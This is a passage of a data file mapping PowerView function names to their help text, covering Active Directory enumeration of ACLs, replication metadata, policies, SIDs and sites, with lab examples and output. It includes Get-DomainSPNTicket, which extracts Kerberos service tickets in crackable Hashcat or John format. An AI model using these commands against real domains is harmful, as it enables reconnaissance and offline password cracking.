                        '.PARAMETER Tombstone\n'
                        '\n'
                        'Switch. Specifies that the searcher should also '
                        'return deleted/tombstoned objects.\n'
                        '\n'
                        '.PARAMETER Credential\n'
                        '\n'
                        'A [Management.Automation.PSCredential] object of '
                        'alternate credentials\n'
                        'for connection to the target domain.\n'
                        '\n'
                        '.EXAMPLE\n'
                        '\n'
                        'Get-DomainObjectAcl -Identity matt.admin -domain '
                        'testlab.local -ResolveGUIDs\n'
                        '\n'
                        'Get the ACLs for the matt.admin user in the '
                        'testlab.local domain and\n'
                        'resolve relevant GUIDs to their display names.\n'
                        '\n'
                        '.EXAMPLE\n'
                        '\n'
                        'Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs\n'
                        '\n'
                        'Enumerate the ACL permissions for all OUs in the '
                        'domain.\n'
                        '\n'
                        '.EXAMPLE\n'
                        '\n'
                        'Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs '
                        '-Sacl\n'
                        '\n'
                        'Enumerate the SACLs for all OUs in the domain, '
                        'resolving GUIDs.\n'
                        '\n'
                        '.EXAMPLE\n'
                        '\n'
                        "$SecPassword = ConvertTo-SecureString 'Password123!' "
                        '-AsPlainText -Force\n'
                        '$Cred = New-Object '
                        "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                        '$SecPassword)\n'
                        'Get-DomainObjectAcl -Credential $Cred -ResolveGUIDs\n'
                        '\n'
                        '.OUTPUTS\n'
                        '\n'
                        'PowerView.ACL\n'
                        '\n'
                        'Custom PSObject with ACL entries.\n',
 'Get-DomainObjectAttributeHistory': '.SYNOPSIS\n'
                                     '\n'
                                     'Returns the Active Directory attribute '
                                     'replication metadata for the specified\n'
                                     'object, i.e. a parsed version of the '
                                     'msds-replattributemetadata attribute.\n'
                                     'By default, replication data for every '
                                     'domain object is returned.\n'
                                     '\n'
                                     'Author: Will Schroeder (@harmj0y)  \n'
                                     'License: BSD 3-Clause  \n'
                                     'Required Dependencies: Get-DomainObject\n'
                                     '\n'
                                     '.DESCRIPTION\n'
                                     '\n'
                                     'Wraps Get-DomainObject with a '
                                     'specification to retrieve the property '
                                     "'msds-replattributemetadata'.\n"
                                     'This is the domain attribute replication '
                                     'metadata associated with the object. The '
                                     'results are\n'
                                     'parsed from their XML string form and '
                                     'returned as a custom object.\n'
                                     '\n'
                                     '.PARAMETER Identity\n'
                                     '\n'
                                     'A SamAccountName (e.g. harmj0y), '
                                     'DistinguishedName (e.g. '
                                     'CN=harmj0y,CN=Users,DC=testlab,DC=local),\n'
                                     'SID (e.g. '
                                     'S-1-5-21-890171859-3433809279-3366196753-1108), '
                                     'or GUID (e.g. '
                                     '4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).\n'
                                     'Wildcards accepted.\n'
                                     '\n'
                                     '.PARAMETER Domain\n'
                                     '\n'
                                     'Specifies the domain to use for the '
                                     'query, defaults to the current domain.\n'
                                     '\n'
                                     '.PARAMETER LDAPFilter\n'
                                     '\n'
                                     'Specifies an LDAP query string that is '
                                     'used to filter Active Directory '
                                     'objects.\n'
                                     '\n'
                                     '.PARAMETER Properties\n'
                                     '\n'
                                     'Only return replication metadata on the '
                                     'specified property names.\n'
                                     '\n'
                                     '.PARAMETER SearchBase\n'
                                     '\n'
                                     'The LDAP source to search through, e.g. '
                                     '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                                     'Useful for OU queries.\n'
                                     '\n'
                                     '.PARAMETER Server\n'
                                     '\n'
                                     'Specifies an Active Directory server '
                                     '(domain controller) to bind to.\n'
                                     '\n'
                                     '.PARAMETER SearchScope\n'
                                     '\n'
                                     'Specifies the scope to search under, '
                                     'Base/OneLevel/Subtree (default of '
                                     'Subtree).\n'
                                     '\n'
                                     '.PARAMETER ResultPageSize\n'
                                     '\n'
                                     'Specifies the PageSize to set for the '
                                     'LDAP searcher object.\n'
                                     '\n'
                                     '.PARAMETER ServerTimeLimit\n'
                                     '\n'
                                     'Specifies the maximum amount of time the '
                                     'server spends searching. Default of 120 '
                                     'seconds.\n'
                                     '\n'
                                     '.PARAMETER Tombstone\n'
                                     '\n'
                                     'Switch. Specifies that the searcher '
                                     'should also return deleted/tombstoned '
                                     'objects.\n'
                                     '\n'
                                     '.PARAMETER Credential\n'
                                     '\n'
                                     'A [Management.Automation.PSCredential] '
                                     'object of alternate credentials\n'
                                     'for connection to the target domain.\n'
                                     '\n'
                                     '.EXAMPLE\n'
                                     '\n'
                                     'Get-DomainObjectAttributeHistory -Domain '
                                     'testlab.local\n'
                                     '\n'
                                     'Return all attribute replication '
                                     'metadata for all objects in the '
                                     'testlab.local domain.\n'
                                     '\n'
                                     '.EXAMPLE\n'
                                     '\n'
                                     "'S-1-5-21-883232822-274137685-4173207997-1109','CN=dfm.a,CN=Users,DC=testlab,DC=local','da','94299db1-e3e7-48f9-845b-3bffef8bedbb' "
                                     '| Get-DomainObjectAttributeHistory '
                                     '-Properties objectClass | ft\n'
                                     '\n'
                                     'ObjectDN      ObjectGuid    AttributeNam '
                                     'LastOriginat Version      LastOriginat\n'
                                     '                            e            '
                                     'ingChange                 ingDsaDN\n'
                                     '--------      ----------    ------------ '
                                     '------------ -------      ------------\n'
                                     'CN=dfm.a,C... a6263874-f... objectClass  '
                                     '2017-03-0... 1            CN=NTDS S...\n'
                                     'CN=DA,CN=U... 77b56df4-f... objectClass  '
                                     '2017-04-1... 1            CN=NTDS S...\n'
                                     'CN=harmj0y... 94299db1-e... objectClass  '
                                     '2017-03-0... 1            CN=NTDS S...\n'
                                     '\n'
                                     '.EXAMPLE\n'
                                     '\n'
                                     'Get-DomainObjectAttributeHistory harmj0y '
                                     '-Properties userAccountControl\n'
                                     '\n'
                                     'ObjectDN              : '
                                     'CN=harmj0y,CN=Users,DC=testlab,DC=local\n'
                                     'ObjectGuid            : '
                                     '94299db1-e3e7-48f9-845b-3bffef8bedbb\n'
                                     'AttributeName         : '
                                     'userAccountControl\n'
                                     'LastOriginatingChange : '
                                     '2017-03-07T19:56:27Z\n'
                                     'Version               : 4\n'
                                     'LastOriginatingDsaDN  : CN=NTDS '
                                     'Settings,CN=PRIMARY,CN=Servers,CN=Default-First\n'
                                     '                        '
                                     '-Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca\n'
                                     '                        l\n'
                                     '\n'
                                     '.OUTPUTS\n'
                                     '\n'
                                     'PowerView.ADObjectAttributeHistory\n'
                                     '\n'
                                     'Custom PSObject with translated '
                                     'replication metadata fields.\n'
                                     '\n'
                                     '.LINK\n'
                                     '\n'
                                     'https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-1-when-did-the-delegation-change-how-to-track-security-descriptor-modifications/\n',
 'Get-DomainObjectLinkedAttributeHistory': '.SYNOPSIS\n'
                                           '\n'
                                           'Returns the Active Directory links '
                                           'attribute value replication '
                                           'metadata for the\n'
                                           'specified object, i.e. a parsed '
                                           'version of the '
                                           'msds-replvaluemetadata attribute.\n'
                                           'By default, replication data for '
                                           'every domain object is returned.\n'
                                           '\n'
                                           'Author: Will Schroeder '
                                           '(@harmj0y)  \n'
                                           'License: BSD 3-Clause  \n'
                                           'Required Dependencies: '
                                           'Get-DomainObject\n'
                                           '\n'
                                           '.DESCRIPTION\n'
                                           '\n'
                                           'Wraps Get-DomainObject with a '
                                           'specification to retrieve the '
                                           'property '
                                           "'msds-replvaluemetadata'.\n"
                                           'This is the domain linked '
                                           'attribute value replication '
                                           'metadata associated with the '
                                           'object. The\n'
                                           'results are parsed from their XML '
                                           'string form and returned as a '
                                           'custom object.\n'
                                           '\n'
                                           '.PARAMETER Identity\n'
                                           '\n'
                                           'A SamAccountName (e.g. harmj0y), '
                                           'DistinguishedName (e.g. '
                                           'CN=harmj0y,CN=Users,DC=testlab,DC=local),\n'
                                           'SID (e.g. '
                                           'S-1-5-21-890171859-3433809279-3366196753-1108), '
                                           'or GUID (e.g. '
                                           '4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).\n'
                                           'Wildcards accepted.\n'
                                           '\n'
                                           '.PARAMETER Domain\n'
                                           '\n'
                                           'Specifies the domain to use for '
                                           'the query, defaults to the current '
                                           'domain.\n'
                                           '\n'
                                           '.PARAMETER LDAPFilter\n'
                                           '\n'
                                           'Specifies an LDAP query string '
                                           'that is used to filter Active '
                                           'Directory objects.\n'
                                           '\n'
                                           '.PARAMETER Properties\n'
                                           '\n'
                                           'Only return replication metadata '
                                           'on the specified property names.\n'
                                           '\n'
                                           '.PARAMETER SearchBase\n'
                                           '\n'
                                           'The LDAP source to search through, '
                                           'e.g. '
                                           '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                                           'Useful for OU queries.\n'
                                           '\n'
                                           '.PARAMETER Server\n'
                                           '\n'
                                           'Specifies an Active Directory '
                                           'server (domain controller) to bind '
                                           'to.\n'
                                           '\n'
                                           '.PARAMETER SearchScope\n'
                                           '\n'
                                           'Specifies the scope to search '
                                           'under, Base/OneLevel/Subtree '
                                           '(default of Subtree).\n'
                                           '\n'
                                           '.PARAMETER ResultPageSize\n'
                                           '\n'
                                           'Specifies the PageSize to set for '
                                           'the LDAP searcher object.\n'
                                           '\n'
                                           '.PARAMETER ServerTimeLimit\n'
                                           '\n'
                                           'Specifies the maximum amount of '
                                           'time the server spends searching. '
                                           'Default of 120 seconds.\n'
                                           '\n'
                                           '.PARAMETER Tombstone\n'
                                           '\n'
                                           'Switch. Specifies that the '
                                           'searcher should also return '
                                           'deleted/tombstoned objects.\n'
                                           '\n'
                                           '.PARAMETER Credential\n'
                                           '\n'
                                           'A '
                                           '[Management.Automation.PSCredential] '
                                           'object of alternate credentials\n'
                                           'for connection to the target '
                                           'domain.\n'
                                           '\n'
                                           '.EXAMPLE\n'
                                           '\n'
                                           'Get-DomainObjectLinkedAttributeHistory '
                                           '| Group-Object ObjectDN | ft -a\n'
                                           '\n'
                                           'Count Name\n'
                                           '----- ----\n'
                                           '    4 '
                                           'CN=Administrators,CN=Builtin,DC=testlab,DC=local\n'
                                           '    4 '
                                           'CN=Users,CN=Builtin,DC=testlab,DC=local\n'
                                           '    2 '
                                           'CN=Guests,CN=Builtin,DC=testlab,DC=local\n'
                                           '    1 '
                                           'CN=IIS_IUSRS,CN=Builtin,DC=testlab,DC=local\n'
                                           '    1 CN=Schema '
                                           'Admins,CN=Users,DC=testlab,DC=local\n'
                                           '    1 CN=Enterprise '
                                           'Admins,CN=Users,DC=testlab,DC=local\n'
                                           '    4 CN=Domain '
                                           'Admins,CN=Users,DC=testlab,DC=local\n'
                                           '    1 CN=Group Policy Creator '
                                           'Owners,CN=Users,DC=testlab,DC=local\n'
                                           '    1 CN=Pre-Windows 2000 '
                                           'Compatible '
                                           'Access,CN=Builtin,DC=testlab,DC=local\n'
                                           '    1 CN=Windows Authorization '
                                           'Access '
                                           'Group,CN=Builtin,DC=testlab,DC=local\n'
                                           '    8 CN=Denied RODC Password '
                                           'Replication '
                                           'Group,CN=Users,DC=testlab,DC=local\n'
                                           '    2 '
                                           'CN=PRIMARY,CN=Topology,CN=Domain '
                                           'System '
                                           'Volume,CN=DFSR-GlobalSettings,...\n'
                                           '    1 CN=Domain System '
                                           'Volume,CN=DFSR-LocalSettings,CN=PRIMARY,OU=Domain '
                                           'Con...\n'
                                           '    1 '
                                           'CN=ServerAdmins,CN=Users,DC=testlab,DC=local\n'
                                           '    3 '
                                           'CN=DomainLocalGroup,CN=Users,DC=testlab,DC=local\n'
                                           '\n'
                                           '\n'
                                           '.EXAMPLE\n'
                                           '\n'
                                           "'S-1-5-21-883232822-274137685-4173207997-519','af94f49e-61a5-4f7d-a17c-d80fb16a5220' "
                                           '| '
                                           'Get-DomainObjectLinkedAttributeHistory\n'
                                           '\n'
                                           'ObjectDN              : '
                                           'CN=Enterprise '
                                           'Admins,CN=Users,DC=testlab,DC=local\n'
                                           'ObjectGuid            : '
                                           '94e782c1-16a1-400b-a7d0-1126038c6387\n'
                                           'AttributeName         : member\n'
                                           'AttributeValue        : '
                                           'CN=Administrator,CN=Users,DC=testlab,DC=local\n'
                                           'TimeDeleted           : '
                                           '2017-03-06T00:48:29Z\n'
                                           'TimeCreated           : '
                                           '2017-03-06T00:48:29Z\n'
                                           'LastOriginatingChange : '
                                           '2017-03-06T00:48:29Z\n'
                                           'Version               : 1\n'
                                           'LastOriginatingDsaDN  : CN=NTDS '
                                           'Settings,CN=PRIMARY,CN=Servers,CN=Default-First\n'
                                           '                        '
                                           '-Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca\n'
                                           '                        l\n'
                                           '\n'
                                           'ObjectDN              : CN=Domain '
                                           'Admins,CN=Users,DC=testlab,DC=local\n'
                                           'ObjectGuid            : '
                                           'af94f49e-61a5-4f7d-a17c-d80fb16a5220\n'
                                           'AttributeName         : member\n'
                                           'AttributeValue        : '
                                           'CN=dfm,CN=Users,DC=testlab,DC=local\n'
                                           'TimeDeleted           : '
                                           '2017-06-13T22:20:02Z\n'
                                           'TimeCreated           : '
                                           '2017-06-13T22:20:02Z\n'
                                           'LastOriginatingChange : '
                                           '2017-06-13T22:20:22Z\n'
                                           'Version               : 2\n'
                                           'LastOriginatingDsaDN  : CN=NTDS '
                                           'Settings,CN=PRIMARY,CN=Servers,CN=Default-First\n'
                                           '                        '
                                           '-Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca\n'
                                           '                        l\n'
                                           '\n'
                                           'ObjectDN              : CN=Domain '
                                           'Admins,CN=Users,DC=testlab,DC=local\n'
                                           'ObjectGuid            : '
                                           'af94f49e-61a5-4f7d-a17c-d80fb16a5220\n'
                                           'AttributeName         : member\n'
                                           'AttributeValue        : '
                                           'CN=Administrator,CN=Users,DC=testlab,DC=local\n'
                                           'TimeDeleted           : '
                                           '2017-03-06T00:48:29Z\n'
                                           'TimeCreated           : '
                                           '2017-03-06T00:48:29Z\n'
                                           'LastOriginatingChange : '
                                           '2017-03-06T00:48:29Z\n'
                                           'Version               : 1\n'
                                           'LastOriginatingDsaDN  : CN=NTDS '
                                           'Settings,CN=PRIMARY,CN=Servers,CN=Default-First\n'
                                           '                        '
                                           '-Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca\n'
                                           '                        l\n'
                                           '\n'
                                           '.EXAMPLE\n'
                                           '\n'
                                           'Get-DomainObjectLinkedAttributeHistory '
                                           'ServerAdmins -Domain '
                                           'testlab.local\n'
                                           '\n'
                                           'ObjectDN              : '
                                           'CN=ServerAdmins,CN=Users,DC=testlab,DC=local\n'
                                           'ObjectGuid            : '
                                           '603b46ad-555c-49b3-8745-c0718febefc2\n'
                                           'AttributeName         : member\n'
                                           'AttributeValue        : '
                                           'CN=jason.a,CN=Users,DC=dev,DC=testlab,DC=local\n'
                                           'TimeDeleted           : '
                                           '2017-04-10T22:17:19Z\n'
                                           'TimeCreated           : '
                                           '2017-04-10T22:17:19Z\n'
                                           'LastOriginatingChange : '
                                           '2017-04-10T22:17:19Z\n'
                                           'Version               : 1\n'
                                           'LastOriginatingDsaDN  : CN=NTDS '
                                           'Settings,CN=PRIMARY,CN=Servers,CN=Default-First\n'
                                           '                        '
                                           '-Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca\n'
                                           '                        l\n'
                                           '\n'
                                           '.OUTPUTS\n'
                                           '\n'
                                           'PowerView.ADObjectLinkedAttributeHistory\n'
                                           '\n'
                                           'Custom PSObject with translated '
                                           'replication metadata fields.\n'
                                           '\n'
                                           '.LINK\n'
                                           '\n'
                                           'https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-2-the-ephemeral-admin-or-how-to-track-the-group-membership/\n',
 'Get-DomainPolicyData': '.SYNOPSIS\n'
                         '\n'
                         'Returns the default domain policy or the domain '
                         'controller policy for the current\n'
                         'domain or a specified domain/domain controller.\n'
                         '\n'
                         'Author: Will Schroeder (@harmj0y)  \n'
                         'License: BSD 3-Clause  \n'
                         'Required Dependencies: Get-DomainGPO, Get-GptTmpl, '
                         'ConvertFrom-SID  \n'
                         '\n'
                         '.DESCRIPTION\n'
                         '\n'
                         'Returns the default domain policy or the domain '
                         'controller policy for the current\n'
                         'domain or a specified domain/domain controller using '
                         'Get-DomainGPO.\n'
                         '\n'
                         '.PARAMETER Domain\n'
                         '\n'
                         'The domain to query for default policies, defaults '
                         'to the current domain.\n'
                         '\n'
                         '.PARAMETER Policy\n'
                         '\n'
                         "Extract 'Domain', 'DC' (domain controller) policies, "
                         "or 'All' for all policies.\n"
                         'Otherwise queries for the particular GPO name or '
                         'GUID.\n'
                         '\n'
                         '.PARAMETER Server\n'
                         '\n'
                         'Specifies an Active Directory server (domain '
                         'controller) to bind to.\n'
                         '\n'
                         '.PARAMETER ServerTimeLimit\n'
                         '\n'
                         'Specifies the maximum amount of time the server '
                         'spends searching. Default of 120 seconds.\n'
                         '\n'
                         '.PARAMETER Credential\n'
                         '\n'
                         'A [Management.Automation.PSCredential] object of '
                         'alternate credentials\n'
                         'for connection to the target domain.\n'
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         'Get-DomainPolicyData\n'
                         '\n'
                         'Returns the default domain policy for the current '
                         'domain.\n'
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         'Get-DomainPolicyData -Domain dev.testlab.local\n'
                         '\n'
                         'Returns the default domain policy for the '
                         'dev.testlab.local domain.\n'
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         'Get-DomainGPO | Get-DomainPolicy\n'
                         '\n'
                         'Parses any GptTmpl.infs found for any policies in '
                         'the current domain.\n'
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         'Get-DomainPolicyData -Policy DC -Domain '
                         'dev.testlab.local\n'
                         '\n'
                         'Returns the policy for the dev.testlab.local domain '
                         'controller.\n'
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         "$SecPassword = ConvertTo-SecureString 'Password123!' "
                         '-AsPlainText -Force\n'
                         '$Cred = New-Object '
                         "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                         '$SecPassword)\n'
                         'Get-DomainPolicyData -Credential $Cred\n'
                         '\n'
                         '.OUTPUTS\n'
                         '\n'
                         'Hashtable\n'
                         '\n'
                         'Ouputs a hashtable representing the parsed '
                         'GptTmpl.inf file.\n',
 'Get-DomainSID': '.SYNOPSIS\n'
                  '\n'
                  'Returns the SID for the current domain or the specified '
                  'domain.\n'
                  '\n'
                  'Author: Will Schroeder (@harmj0y)  \n'
                  'License: BSD 3-Clause  \n'
                  'Required Dependencies: Get-DomainComputer  \n'
                  '\n'
                  '.DESCRIPTION\n'
                  '\n'
                  'Returns the SID for the current domain or the specified '
                  'domain by executing\n'
                  'Get-DomainComputer with the -LDAPFilter set to '
                  '(userAccountControl:1.2.840.113556.1.4.803:=8192)\n'
                  'to search for domain controllers through LDAP. The SID of '
                  'the returned domain controller\n'
                  'is then extracted.\n'
                  '\n'
                  '.PARAMETER Domain\n'
                  '\n'
                  'Specifies the domain to use for the query, defaults to the '
                  'current domain.\n'
                  '\n'
                  '.PARAMETER Server\n'
                  '\n'
                  'Specifies an Active Directory server (domain controller) to '
                  'bind to.\n'
                  '\n'
                  '.PARAMETER Credential\n'
                  '\n'
                  'A [Management.Automation.PSCredential] object of alternate '
                  'credentials\n'
                  'for connection to the target domain.\n'
                  '\n'
                  '.EXAMPLE\n'
                  '\n'
                  'Get-DomainSID\n'
                  '\n'
                  '.EXAMPLE\n'
                  '\n'
                  'Get-DomainSID -Domain testlab.local\n'
                  '\n'
                  '.EXAMPLE\n'
                  '\n'
                  "$SecPassword = ConvertTo-SecureString 'Password123!' "
                  '-AsPlainText -Force\n'
                  '$Cred = New-Object '
                  "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                  '$SecPassword)\n'
                  'Get-DomainSID -Credential $Cred\n'
                  '\n'
                  '.OUTPUTS\n'
                  '\n'
                  'String\n'
                  '\n'
                  'A string representing the specified domain SID.\n',
 'Get-DomainSPNTicket': '.SYNOPSIS\n'
                        '\n'
                        'Request the kerberos ticket for a specified service '
                        'principal name (SPN).\n'
                        '\n'
                        'Author: machosec, Will Schroeder (@harmj0y)  \n'
                        'License: BSD 3-Clause  \n'
                        'Required Dependencies: Invoke-UserImpersonation, '
                        'Invoke-RevertToSelf  \n'
                        '\n'
                        '.DESCRIPTION\n'
                        '\n'
                        'This function will either take one/more SPN strings, '
                        'or one/more PowerView.User objects\n'
                        '(the output from Get-DomainUser) and will request a '
                        'kerberos ticket for the given SPN\n'
                        'using '
                        'System.IdentityModel.Tokens.KerberosRequestorSecurityToken. '
                        'The encrypted\n'
                        'portion of the ticket is then extracted and output in '
                        'either crackable John or Hashcat\n'
                        'format (deafult of Hashcat).\n'
                        '\n'
                        '.PARAMETER SPN\n'
                        '\n'
                        'Specifies the service principal name to request the '
                        'ticket for.\n'
                        '\n'
                        '.PARAMETER User\n'
                        '\n'
                        'Specifies a PowerView.User object (result of '
                        'Get-DomainUser) to request the ticket for.\n'
                        '\n'
                        '.PARAMETER OutputFormat\n'
                        '\n'
                        "Either 'John' for John the Ripper style hash "
                        "formatting, or 'Hashcat' for Hashcat format.\n"
                        "Defaults to 'John'.\n"
                        '\n'
                        '.PARAMETER Credential\n'
                        '\n'
                        'A [Management.Automation.PSCredential] object of '
                        'alternate credentials\n'
                        'for connection to the remote domain using '
                        'Invoke-UserImpersonation.\n'
                        '\n'
                        '.EXAMPLE\n'
                        '\n'
                        'Get-DomainSPNTicket -SPN "HTTP/web.testlab.local"\n'
                        '\n'
                        'Request a kerberos service ticket for the specified '
                        'SPN.\n'
                        '\n'
                        '.EXAMPLE\n'
                        '\n'
                        '"HTTP/web1.testlab.local","HTTP/web2.testlab.local" | '
                        'Get-DomainSPNTicket\n'
                        '\n'
                        'Request kerberos service tickets for all SPNs passed '
                        'on the pipeline.\n'
                        '\n'
                        '.EXAMPLE\n'
                        '\n'
                        'Get-DomainUser -SPN | Get-DomainSPNTicket '
                        '-OutputFormat JTR\n'
                        '\n'
                        'Request kerberos service tickets for all users with '
                        'non-null SPNs and output in JTR format.\n'
                        '\n'
                        '.INPUTS\n'
                        '\n'
                        'String\n'
                        '\n'
                        'Accepts one or more SPN strings on the pipeline with '
                        'the RawSPN parameter set.\n'
                        '\n'
                        '.INPUTS\n'
                        '\n'
                        'PowerView.User\n'
                        '\n'
                        'Accepts one or more PowerView.User objects on the '
                        'pipeline with the User parameter set.\n'
                        '\n'
                        '.OUTPUTS\n'
                        '\n'
                        'PowerView.SPNTicket\n'
                        '\n'
                        'Outputs a custom object containing the '
                        'SamAccountName, ServicePrincipalName, and encrypted '
                        'ticket section.\n',
 'Get-DomainSearcher': '.SYNOPSIS\n'
                       '\n'
                       'Helper used by various functions that builds a custom '
                       'AD searcher object.\n'
                       '\n'
                       'Author: Will Schroeder (@harmj0y)  \n'
                       'License: BSD 3-Clause  \n'
                       'Required Dependencies: Get-Domain  \n'
                       '\n'
                       '.DESCRIPTION\n'
                       '\n'
                       'Takes a given domain and a number of customizations '
                       'and returns a\n'
                       'System.DirectoryServices.DirectorySearcher object. '
                       'This function is used\n'
                       'heavily by other LDAP/ADSI searcher functions '
                       '(Verb-Domain*).\n'
                       '\n'
                       '.PARAMETER Domain\n'
                       '\n'
                       'Specifies the domain to use for the query, defaults to '
                       'the current domain.\n'
                       '\n'
                       '.PARAMETER LDAPFilter\n'
                       '\n'
                       'Specifies an LDAP query string that is used to filter '
                       'Active Directory objects.\n'
                       '\n'
                       '.PARAMETER Properties\n'
                       '\n'
                       'Specifies the properties of the output object to '
                       'retrieve from the server.\n'
                       '\n'
                       '.PARAMETER SearchBase\n'
                       '\n'
                       'The LDAP source to search through, e.g. '
                       '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                       'Useful for OU queries.\n'
                       '\n'
                       '.PARAMETER SearchBasePrefix\n'
                       '\n'
                       'Specifies a prefix for the LDAP search string (i.e. '
                       '"CN=Sites,CN=Configuration").\n'
                       '\n'
                       '.PARAMETER Server\n'
                       '\n'
                       'Specifies an Active Directory server (domain '
                       'controller) to bind to for the search.\n'
                       '\n'
                       '.PARAMETER SearchScope\n'
                       '\n'
                       'Specifies the scope to search under, '
                       'Base/OneLevel/Subtree (default of Subtree).\n'
                       '\n'
                       '.PARAMETER ResultPageSize\n'
                       '\n'
                       'Specifies the PageSize to set for the LDAP searcher '
                       'object.\n'
                       '\n'
                       '.PARAMETER ResultPageSize\n'
                       '\n'
                       'Specifies the PageSize to set for the LDAP searcher '
                       'object.\n'
                       '\n'
                       '.PARAMETER ServerTimeLimit\n'
                       '\n'
                       'Specifies the maximum amount of time the server spends '
                       'searching. Default of 120 seconds.\n'
                       '\n'
                       '.PARAMETER SecurityMasks\n'
                       '\n'
                       'Specifies an option for examining security information '
                       'of a directory object.\n'
                       "One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.\n"
                       '\n'
                       '.PARAMETER Tombstone\n'
                       '\n'
                       'Switch. Specifies that the searcher should also return '
                       'deleted/tombstoned objects.\n'
                       '\n'
                       '.PARAMETER Credential\n'
                       '\n'
                       'A [Management.Automation.PSCredential] object of '
                       'alternate credentials\n'
                       'for connection to the target domain.\n'
                       '\n'
                       '.EXAMPLE\n'
                       '\n'
                       'Get-DomainSearcher -Domain testlab.local\n'
                       '\n'
                       'Return a searcher for all objects in testlab.local.\n'
                       '\n'
                       '.EXAMPLE\n'
                       '\n'
                       'Get-DomainSearcher -Domain testlab.local -LDAPFilter '
                       "'(samAccountType=805306368)' -Properties "
                       "'SamAccountName,lastlogon'\n"
                       '\n'
                       'Return a searcher for user objects in testlab.local '
                       'and only return the SamAccountName and LastLogon '
                       'properties.\n'
                       '\n'
                       '.EXAMPLE\n'
                       '\n'
                       'Get-DomainSearcher -SearchBase '
                       '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                       '\n'
                       'Return a searcher that searches through the specific '
                       'ADS/LDAP search base (i.e. OU).\n'
                       '\n'
                       '.OUTPUTS\n'
                       '\n'
                       'System.DirectoryServices.DirectorySearcher\n',
 'Get-DomainSite': '.SYNOPSIS\n'
                   '\n'
                   'Search for all sites or specific site objects in AD.\n'
                   '\n'
                   'Author: Will Schroeder (@harmj0y)  \n'
                   'License: BSD 3-Clause  \n'
                   'Required Dependencies: Get-DomainSearcher, '
                   'Convert-LDAPProperty  \n'
                   '\n'
                   '.DESCRIPTION\n'
                   '\n'
                   'Builds a directory searcher object using '
                   'Get-DomainSearcher, builds a custom\n'
                   'LDAP filter based on targeting/filter parameters, and '
                   'searches for all objects\n'
                   'matching the criteria. To only return specific properties, '
                   'use\n'
                   '"-Properties whencreated,usnchanged,...". By default, all '
                   'site objects for\n'
                   'the current domain are returned.\n'
                   '\n'
                   '.PARAMETER Identity\n'
                   '\n'
                   'An site name (e.g. Test-Site), DistinguishedName (e.g. '
                   'CN=Test-Site,CN=Sites,CN=Configuration,DC=testlab,DC=local), '
                   'or\n'
                   'GUID (e.g. c37726ef-2b64-4524-b85b-6a9700c234dd). '
                   'Wildcards accepted.\n'
                   '\n'
                   '.PARAMETER GPLink\n'
                   '\n'
                   'Only return sites with the specified GUID in their gplink '
                   'property.\n'
                   '\n'
                   '.PARAMETER Domain\n'
                   '\n'
                   'Specifies the domain to use for the query, defaults to the '
                   'current domain.\n'
                   '\n'
                   '.PARAMETER LDAPFilter\n'
                   '\n'
                   'Specifies an LDAP query string that is used to filter '
                   'Active Directory objects.\n'
                   '\n'
                   '.PARAMETER Properties\n'
                   '\n'
                   'Specifies the properties of the output object to retrieve '
                   'from the server.\n'
                   '\n'
                   '.PARAMETER SearchBase\n'
                   '\n'
                   'The LDAP source to search through, e.g. '
                   '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                   'Useful for OU queries.\n'
                   '\n'
                   '.PARAMETER Server\n'
                   '\n'
                   'Specifies an Active Directory server (domain controller) '
                   'to bind to.\n'
                   '\n'
                   '.PARAMETER SearchScope\n'
                   '\n'
                   'Specifies the scope to search under, Base/OneLevel/Subtree '
                   '(default of Subtree).\n'
                   '\n'
                   '.PARAMETER ResultPageSize\n'
                   '\n'
                   'Specifies the PageSize to set for the LDAP searcher '
                   'object.\n'
                   '\n'
                   '.PARAMETER ServerTimeLimit\n'
                   '\n'
                   'Specifies the maximum amount of time the server spends '
                   'searching. Default of 120 seconds.\n'
                   '\n'
                   '.PARAMETER SecurityMasks\n'
                   '\n'
                   'Specifies an option for examining security information of '
                   'a directory object.\n'
                   "One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.\n"
                   '\n'
                   '.PARAMETER Tombstone\n'
                   '\n'
                   'Switch. Specifies that the searcher should also return '
                   'deleted/tombstoned objects.\n'
                   '\n'
                   '.PARAMETER FindOne\n'
                   '\n'
                   'Only return one result object.\n'
                   '\n'
                   '.PARAMETER Credential\n'
                   '\n'
                   'A [Management.Automation.PSCredential] object of alternate '
                   'credentials\n'
                   'for connection to the target domain.\n'
                   '\n'
                   '.PARAMETER Raw\n'
                   '\n'
                   'Switch. Return raw results instead of translating the '
                   'fields into a custom PSObject.\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   'Get-DomainSite\n'
                   '\n'
                   'Returns the current sites in the domain.\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   'Get-DomainSite *admin* -Domain testlab.local\n'
                   '\n'
                   'Returns all sites with "admin" in their name in the '
                   'testlab.local domain.\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   'Get-DomainSite -GPLink '
                   '"F260B76D-55C8-46C5-BEF1-9016DD98E272"\n'
                   '\n'
                   'Returns all sites with linked to the specified group '
                   'policy object.\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   "$SecPassword = ConvertTo-SecureString 'Password123!' "
                   '-AsPlainText -Force\n'
